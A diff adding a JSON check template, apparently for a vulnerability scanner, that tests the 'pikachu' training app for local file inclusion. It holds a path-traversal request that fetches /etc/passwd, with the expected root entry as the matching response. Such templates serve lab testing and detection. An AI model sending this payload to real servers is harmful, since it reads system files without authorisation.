@@ -1,0 +1,27 @@
+{
+    "name": "pikachu",
+    "vuln": "本地文件包含",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "GET",
+                "path": "/vul/fileinclude/fi_local.php?filename=/../../../../etc/passwd&submit=%E6%8F%90%E4%BA%A4",
+                "cookie": "",
+                "requestheader": "",
+                "requestbody": ""
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "root:x:0:0:root:/root:/bin/bash"
+            }
+        }
+    }
+}
+
